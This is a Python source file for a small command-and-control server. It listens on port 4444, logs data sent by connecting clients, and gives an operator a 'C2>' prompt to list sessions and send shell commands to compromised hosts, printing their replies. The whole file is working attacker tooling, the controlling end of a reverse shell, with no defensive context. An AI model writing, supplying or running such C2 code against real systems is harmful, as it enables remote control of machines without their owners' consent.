import socket
import threading
import argparse
import datetime
import os

# Globals
active_connections = []
lock = threading.Lock()

def handle_client(client_socket, client_address):
    ip, port = client_address
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"{ip}_{timestamp}.log"
    os.makedirs("logs", exist_ok=True)
    log_path = os.path.join("logs", log_file)

    with lock:
        active_connections.append({
            "socket": client_socket,
            "address": client_address,
            "log": log_path
        })

    try:
        client_socket.send(b"[+] Connected\n")
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            with open(log_path, "a") as f:
                f.write(data.decode())
    except:
        pass
    finally:
        with lock:
            active_connections[:] = [c for c in active_connections if c["socket"] != client_socket]
        client_socket.close()

def accept_connections(server_socket):
    while True:
        client_sock, addr = server_socket.accept()
        print(f"[+] New connection from {addr[0]}:{addr[1]}")
        threading.Thread(target=handle_client, args=(client_sock, addr), daemon=True).start()

def command_loop():
    while True:
        cmd = input("C2> ").strip()
        if cmd == "sessions":
            with lock:
                for i, conn in enumerate(active_connections):
                    ip, port = conn["address"]
                    print(f"[{i}] {ip}:{port} -> Log: {conn['log']}")
        elif cmd.startswith("interact "):
            parts = cmd.split()
            if len(parts) != 2 or not parts[1].isdigit():
                print("Usage: interact <id>")
                continue
            idx = int(parts[1])
            with lock:
                if idx < 0 or idx >= len(active_connections):
                    print("Invalid session ID")
                    continue
                client = active_connections[idx]["socket"]

            print(f"[+] Interacting with session {idx}. Type 'exit' to quit.")
            while True:
                user_cmd = input("Shell> ")
                if user_cmd.strip().lower() == "exit":
                    break
                try:
                    #set timer for response
                    client.send(user_cmd.encode() + b"\n")
                    response = client.recv(4096).decode()
                    print(response.strip())
                except:
                    print("[!] Connection lost.")
                    break
        elif cmd == "exit":
            break
        else:
            print("Commands:\n  sessions - List active sessions\n  interact <id> - Interact with session\n  exit - Quit")

def main():
    parser = argparse.ArgumentParser(description="Lite Python C2 Server")
    parser.add_argument("--port", type=int, default=4444, help="Port to listen on")
    args = parser.parse_args()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", args.port))
    server.listen(5)
    print(f"[+] Listening on port {args.port}")

    threading.Thread(target=accept_connections, args=(server,), daemon=True).start()
    command_loop()

if __name__ == "__main__":
    main()
